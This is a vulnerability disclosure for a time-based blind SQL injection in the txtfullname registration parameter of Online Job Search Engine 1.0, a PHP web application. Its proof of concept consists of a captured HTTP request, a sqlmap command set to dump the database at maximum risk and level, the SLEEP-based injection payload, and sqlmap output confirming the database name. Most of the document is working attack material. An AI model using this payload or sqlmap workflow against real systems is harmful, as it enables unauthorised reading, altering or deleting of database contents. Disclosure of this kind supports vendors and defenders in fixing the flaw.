# Online Job Search Engine - SQL Injection
+ *Exploit Title:* Online Job Search Engine - SQL Injection
+ *Date:* 2025-26-09
+ *Exploit Author:* Hazar Taşpınar
+ *Vendor Homepage:* https://code-projects.org/online-job-search-engine-in-php-with-source-code/
+ *Software Link:* https://download.code-projects.org/details/cf939e5e-03c7-4137-982a-0cb7a1951323
+ *Version:* 1.0
+ *Tested on:* Windows 11 Professional + PHP 5.6.40, Apache 2.4.38
+ *CVE:* Reported, Waiting for CVE number

## References: 
+ https://portswigger.net/web-security/sql-injection

## Description:
Online Job Search Engine 1.0 — a time-based blind SQL injection was found in the POST parameter txtfullname, allowing attackers to potentially read, modify or delete database contents (back-end DBMS identified as MySQL).

## Proof of Concept:
+ Go to this address: http://192.168.1.6/onlinejobsearchengine/registration.php
+ fill them all randomly
+ Capture the request via Burp Suite and send it to the Repeater.
+ Copy the request and paste it into an "r.txt" file.
+ Captured Burp request:
```
POST /onlinejobsearchengine/registration.php HTTP/1.1
Host: 192.168.1.6
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 292
Origin: http://192.168.1.6
Connection: keep-alive
Referer: http://192.168.1.6/onlinejobsearchengine/registration.php
Cookie: PHPSESSID=bmpn3922cigtn7sfl9ogm5f401
Upgrade-Insecure-Requests: 1
Priority: u=0, i

txtfullname=hello&txtphone=1234512345&state=---+Please+select+your+State+---&month=Jan&day=1&year=2011&cmdsex=Male&txtaddress=+&cmdqualification=FSLC&cmdspecialization=+Accounting+%2F+Audit+%2F+Tax&txtregID=X9WWMW&txtusername=hello21&updatepin=used&propic=uploads%2Fdefault.jpg&submit=Sign+Up
```
+ Use sqlmap to exploit.
```
sqlmap -r req.txt --batch --dump --current-db --dbms mysql --risk 3 --level 5
```
```
---                                                                                                                                          
Parameter: txtfullname (POST)                                                                                                                
    Type: time-based blind                                                                                                                   
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)                                                                                
    Payload: txtfullname=hello' AND (SELECT 7135 FROM (SELECT(SLEEP(5)))RFPv) AND 'kryZ'='kryZ&txtphone=1234512345&state=Akwa Ibom &month=Jan
&day=1&year=2011&cmdsex=Male&txtaddress= 99iso&cmdqualification=FSLC&cmdspecialization= Accounting / Audit / Tax&txtregID=PS0A1U&txtusername=
helloww&updatepin=used&propic=uploads/default.jpg&submit=Sign Up                                                                             
---                                                                                                                                          
[23:17:46] [INFO] testing MySQL                                                                                                              
[23:17:46] [INFO] confirming MySQL                                                                                                           
[23:17:46] [INFO] the back-end DBMS is MySQL                                                                                                 
web application technology: PHP 5.6.40, Apache 2.4.38                                                                                        
back-end DBMS: MySQL >= 5.0.0 (MariaDB fork)                                                                                                 
[23:17:46] [INFO] fetching current database                                                                                                  
[23:17:46] [INFO] resumed: onlinejob                                                                                                         
current database: 'onlinejob'
```
+ current database : `onlinejob`

<img width="1429" height="406" alt="image" src="https://github.com/user-attachments/assets/1b75f778-42b1-4297-9391-32dba4bf4e0d" />



  


  
